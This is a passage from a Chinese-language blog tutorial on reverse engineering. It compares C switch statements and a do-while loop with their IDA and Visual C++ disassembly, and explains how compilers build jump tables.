class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    myFunction(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码  (这里仅放function的部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"> myFunction      proc near               ; CODE XREF: main+<span class="hljs-number">12</span>↓p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h   <span class="hljs-comment">//传入参数</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp  <br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h                 <span class="hljs-comment">//开辟空间 </span><br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx  <span class="hljs-comment">//把 传入的参数 给 函数体内的局部变量 </span><br>.text:<span class="hljs-number">000000000040155B</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>   <span class="hljs-comment">// if(x==2)</span><br>.text:<span class="hljs-number">000000000040155F</span>                 jz      <span class="hljs-keyword">short</span> loc_401589<br>.text:<span class="hljs-number">0000000000401561</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>  <span class="hljs-comment">//if(x&gt;2)</span><br>.text:<span class="hljs-number">0000000000401565</span>                 jg      <span class="hljs-keyword">short</span> loc_40156F<br>.text:<span class="hljs-number">0000000000401567</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span> <span class="hljs-comment">//if(x==1)</span><br>.text:<span class="hljs-number">000000000040156B</span>                 jz      <span class="hljs-keyword">short</span> loc_40157D  <br>.text:<span class="hljs-number">000000000040156</span>D                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040156F</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040156F</span><br>.text:<span class="hljs-number">000000000040156F</span> loc_40156F:                             ; CODE XREF: myFunction+<span class="hljs-number">15</span>↑j<br>.text:<span class="hljs-number">000000000040156F</span>                 cmp     [rbp+arg_0], <span class="hljs-number">3</span>   <br>.text:<span class="hljs-number">0000000000401573</span>                 jz      <span class="hljs-keyword">short</span> loc_401595<br>.text:<span class="hljs-number">0000000000401575</span>                 cmp     [rbp+arg_0], <span class="hljs-number">4</span><br>.text:<span class="hljs-number">0000000000401579</span>                 jz      <span class="hljs-keyword">short</span> loc_4015A1<br>.text:<span class="hljs-number">000000000040157B</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040157</span>D ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040157</span>D<br>.text:<span class="hljs-number">000000000040157</span>D loc_40157D:                             ; CODE XREF: myFunction+<span class="hljs-number">1B</span>↑j<br>.text:<span class="hljs-number">000000000040157</span>D                 mov     ecx, <span class="hljs-number">31</span>h ; <span class="hljs-string">&#x27;1&#x27;</span>  ; Character<br>.text:<span class="hljs-number">0000000000401582</span>                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">//printf(&quot;1&quot;);</span><br>.text:<span class="hljs-number">0000000000401587</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401589</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401589</span><br>.text:<span class="hljs-number">0000000000401589</span> loc_401589:                             ; CODE XREF: myFunction+F↑j<br>.text:<span class="hljs-number">0000000000401589</span>                 mov     ecx, <span class="hljs-number">32</span>h ; <span class="hljs-string">&#x27;2&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">// printf(&quot;2&quot;);</span><br>.text:<span class="hljs-number">0000000000401593</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401595</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401595</span><br>.text:<span class="hljs-number">0000000000401595</span> loc_401595:                             ; CODE XREF: myFunction+<span class="hljs-number">23</span>↑j<br>.text:<span class="hljs-number">0000000000401595</span>                 mov     ecx, <span class="hljs-number">33</span>h ; <span class="hljs-string">&#x27;3&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040159</span>A                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;3&quot;);</span><br>.text:<span class="hljs-number">000000000040159F</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>A1 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A1<br>.text:<span class="hljs-number">00000000004015</span>A1 loc_4015A1:                             ; CODE XREF: myFunction+<span class="hljs-number">29</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     ecx, <span class="hljs-number">34</span>h ; <span class="hljs-string">&#x27;4&#x27;</span>  ; Character<br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;4&quot;);</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>AD ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>AD<br>.text:<span class="hljs-number">00000000004015</span>AD loc_4015AD:                             ; CODE XREF: myFunction+<span class="hljs-number">1</span>D↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                                         ; myFunction+<span class="hljs-number">2B</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                 lea     rcx, Format     ; <span class="hljs-string">&quot;error&quot;</span>  <span class="hljs-comment">//default:error</span><br>.text:<span class="hljs-number">00000000004015B</span>4                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>9<br>.text:<span class="hljs-number">00000000004015B</span>9 loc_4015B9:                             ; CODE XREF: myFunction+<span class="hljs-number">37</span>↑j<br>.text:<span class="hljs-number">00000000004015B</span>9                                         ; myFunction+<span class="hljs-number">43</span>↑j ...<br>.text:<span class="hljs-number">00000000004015B</span>9                 nop<br>.text:<span class="hljs-number">00000000004015B</span>A                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>E                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>F                 retn<br>.text:<span class="hljs-number">00000000004015B</span>F myFunction      endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于7"><a href="#switch-分支大于7" class="headerlink" title="switch 分支大于7"></a>switch 分支大于7</h4><p>当switch的分支大于7时</p><p>这是小表存放跳转的索引 即 edx</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261422135.png" alt="image-20211226142233001"></p><p>内存会建立跳转表 存放 每个case后的函数体的起始地址</p><p>这里的寻址类似于数组的寻址  address&#x3D;[第一个case的起始地址+4*寄存器(步长)]</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261718094.png" alt="image-20211226171819013"></p><p>如图，展示了大表存储跳转表的地址</p><p>可知     jmp [寄存器*4 + 0xxxxx] ;跳转表模式的重要特征</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">233</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;233&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9&quot;</span>);<span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-keyword">break</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Function(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">4</span>:        <span class="hljs-keyword">switch</span>(x)<br><span class="hljs-number">5</span>:        &#123;<br><span class="hljs-number">0040</span>D898   mov         eax,dword ptr [ebp+<span class="hljs-number">8</span>]<br><span class="hljs-number">0040</span>D89B   mov         dword ptr [ebp<span class="hljs-number">-4</span>],eax<br><span class="hljs-number">0040</span>D89E   mov         ecx,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8A1   sub         ecx,<span class="hljs-number">1</span><br><span class="hljs-number">0040</span>D8A4   mov         dword ptr [ebp<span class="hljs-number">-4</span>],ecx<br><span class="hljs-number">0040</span>D8A7   cmp         dword ptr [ebp<span class="hljs-number">-4</span>],<span class="hljs-number">0E8</span>h<br><span class="hljs-number">0040</span>D8AE   ja          $L548+<span class="hljs-number">0F</span>h (<span class="hljs-number">0040</span>d950)<br><span class="hljs-number">0040</span>D8B4   mov         eax,dword ptr [ebp<span class="hljs-number">-4</span>]<br><span class="hljs-number">0040</span>D8B7   <span class="hljs-keyword">xor</span>         edx,edx<br><span class="hljs-number">0040</span>D8B9   mov         dl,<span class="hljs-function">byte <span class="hljs-title">ptr</span>  <span class="hljs-params">(<span class="hljs-number">0040</span>d996)</span>[eax]</span><br><span class="hljs-function">0040D8BF   jmp         dword ptr [edx*4+40D96Eh]    <span class="hljs-comment">//计算出跳转表的地址 然后 根据跳转存储的值 跳转到 case语句部分</span></span><br><span class="hljs-function">6:        <span class="hljs-keyword">case</span> 1:</span><br><span class="hljs-function">7:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;1&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8C6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;1&quot;</span> (<span class="hljs-number">0042203</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D8CB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8D0   add         esp,4</span><br><span class="hljs-function">0040D8D3   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">8:        <span class="hljs-keyword">case</span> 2:</span><br><span class="hljs-function">9:            <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;2&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8D8   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;2&quot;</span> (<span class="hljs-number">00422038</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8DD   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8E2   add         esp,4</span><br><span class="hljs-function">0040D8E5   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">10:       <span class="hljs-keyword">case</span> 3:</span><br><span class="hljs-function">11:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;3&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8E7   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;3&quot;</span> (<span class="hljs-number">00422034</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8EC   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D8F1   add         esp,4</span><br><span class="hljs-function">0040D8F4   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">12:       <span class="hljs-keyword">case</span> 4:</span><br><span class="hljs-function">13:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;4&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D8F6   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;4&quot;</span> (<span class="hljs-number">00422030</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D8FB   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D900   add         esp,4</span><br><span class="hljs-function">0040D903   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">14:       <span class="hljs-keyword">case</span> 5:</span><br><span class="hljs-function">15:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;5&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D905   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;5&quot;</span> (<span class="hljs-number">0042202</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D90A   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D90F   add         esp,4</span><br><span class="hljs-function">0040D912   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">16:</span><br><span class="hljs-function">17:       <span class="hljs-keyword">case</span> 233:</span><br><span class="hljs-function">18:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;233&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D914   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;12&quot;</span> (<span class="hljs-number">0042201</span>c)<br><span class="hljs-number">0040</span><span class="hljs-function">D919   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D91E   add         esp,4</span><br><span class="hljs-function">0040D921   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">19:</span><br><span class="hljs-function">20:       <span class="hljs-keyword">case</span> 7:</span><br><span class="hljs-function">21:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;7&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D923   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;7&quot;</span> (<span class="hljs-number">00422028</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D928   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D92D   add         esp,4</span><br><span class="hljs-function">0040D930   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">22:       <span class="hljs-keyword">case</span> 8:</span><br><span class="hljs-function">23:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;8&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D932   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;10&quot;</span> (<span class="hljs-number">00422024</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D937   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D93C   add         esp,4</span><br><span class="hljs-function">0040D93F   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">24:       <span class="hljs-keyword">case</span> 9:</span><br><span class="hljs-function">25:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;9&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D941   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;11&quot;</span> (<span class="hljs-number">00422020</span>)<br><span class="hljs-number">0040</span><span class="hljs-function">D946   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D94B   add         esp,4</span><br><span class="hljs-function">0040D94E   jmp         $L548+1<span class="hljs-title">Ch</span> <span class="hljs-params">(<span class="hljs-number">0040</span>d95d)</span></span><br><span class="hljs-function">26:       <span class="hljs-keyword">default</span>:</span><br><span class="hljs-function">27:           <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;error&quot;</span>)</span></span>;<span class="hljs-keyword">break</span>;<br><span class="hljs-number">0040</span>D950   push        offset <span class="hljs-built_in">string</span> <span class="hljs-string">&quot;error&quot;</span> (<span class="hljs-number">00422f</span>cc)<br><span class="hljs-number">0040</span><span class="hljs-function">D955   call        <span class="hljs-title">printf</span> <span class="hljs-params">(<span class="hljs-number">004011f</span>0)</span></span><br><span class="hljs-function">0040D95A   add         esp,4</span><br><span class="hljs-function">28:</span><br><span class="hljs-function">29:       &#125;</span><br><span class="hljs-function">30:   &#125;</span><br></code></pre></td></tr></table></figure><h3 id="dowhile"><a href="#dowhile" class="headerlink" title="dowhile"></a>dowhile</h3><p>特点：</p><p>​    向上跳转（分支语句都是向上跳转）</p><p>​    跳转条件不反写</p><p>​    只用一次跳转，效率最高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> nSum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> <br>    &#123;<br>        nSum = nSum + i;<br>    &#125; <span class="hljs-keyword">while</span> (i &lt;=<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_8           = dword ptr <span class="hljs-number">-8</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main       <span class="hljs-comment">//main开始</span><br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">0</span>   <span class="hljs-comment">//a=0</span><br>.text:<span class="hljs-number">000000000040156B</span>                 mov     [rbp+var_8], <span class="hljs-number">0</span>  <span class="hljs-comment">//b=0</span><br>.text:<span class="hljs-number">0000000000401572</span><br>.text:<span class="hljs-number">0000000000401572</span> loc_401572:                             ; CODE XREF: main+<span class="hljs-number">2</span>C↓j<br>.text:<span class="hljs-number">0000000000401572</span>                 mov     eax, [rbp+var_8]  <span class="hljs-comment">//eax=b</span><br>.text:<span class="hljs-number">0000000000401575</span>                 add     [rbp+var_4], eax  <span 